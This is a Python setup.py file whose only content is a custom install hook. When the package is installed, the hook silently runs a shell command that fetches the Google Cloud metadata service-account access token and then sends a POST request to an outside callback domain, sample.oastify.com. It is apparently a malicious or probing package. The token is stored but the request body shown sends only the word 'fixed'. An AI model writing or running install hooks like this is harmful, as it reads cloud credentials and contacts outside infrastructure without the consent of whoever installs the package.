import os
from setuptools import setup
from setuptools.command.install import install
def command():
    os.system('access_token=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token); curl -X POST -d "fixed" https://sample.oastify.com/')
class Hook(install):
    def run(self):
        command()
setup(cmdclass={'install': Hook})
